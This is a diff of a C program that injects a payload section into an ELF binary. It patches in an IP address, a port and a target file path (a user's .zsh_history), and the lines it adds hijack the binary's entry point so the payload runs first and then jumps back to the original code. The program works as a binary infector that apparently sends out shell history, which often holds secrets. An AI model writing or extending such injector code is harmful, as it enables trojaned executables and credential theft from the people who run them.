@@ -119,7 +119,7 @@ int main(void) {
 
 	memcpy(map + new_section_offset + payload_size_p - 4, &addr_ip, sizeof(uint32_t));
 	memcpy(map + new_section_offset + payload_size_p - 2 - 4, &port, sizeof(uint16_t));
-	const char *targetfile = "/home/maxence/.zsh_history";
+	const char targetfile[] = "/home/maxence/.zsh_history";
 	memcpy(map + new_section_offset + payload_size_p - 1024 - 2 - 4, targetfile, sizeof(targetfile));
 
 	/**
@@ -177,10 +177,6 @@ int main(void) {
     // Update section header string table index
     ehdr->e_shstrndx += 1;
 
-    // Update the entry point
-    // Elf64_Addr old_entry_point = ehdr->e_entry;
-    // ehdr->e_entry = new_section_addr;
-
 	if (msync(map, new_filesize, MS_SYNC) == -1) {
 		perror("msync");
 	}
@@ -189,14 +185,23 @@ int main(void) {
 	{
 		printf("shdrs[%lu].sh_offset: %p\n", i, shdrs + i);
 	}
+
+	// Update the entry point
+    Elf64_Addr old_entry_point = ehdr->e_entry;
+    ehdr->e_entry = new_section_addr;
 	
     // // Calculate the relative jump offset to the old entry point
-    // int32_t jump_offset = (int32_t)(old_entry_point - (new_section_addr + payload_size_p - 5) - 5);
+    int32_t jump_offset = (int32_t)(old_entry_point - (new_section_addr + payload_size_p - 5) - 5);
+	printf("offset to old: %#lx\n", jump_offset);
 
     // // Write the relative jump instruction at the end of the payload
-    // size_t jump_instr_offset = payload_size_p - 1186 - 6 - 4;
-    // *((uint8_t *)map + new_section_offset + jump_instr_offset) = 0xE9; // Opcode for jmp (relative)
-    // memcpy((char *)map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
+    size_t jump_instr_offset = payload_size_p - 1186 - 6 - 4;
+    *((uint8_t *)map + new_section_offset + jump_instr_offset) = 0xE9; // Opcode for jmp (relative)
+    memcpy((char *)map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
+
+	if (msync(map, new_filesize, MS_SYNC) == -1) {
+		perror("msync");
+	}
 
     // Cleanup
     if (munmap(map, new_filesize) == -1) {
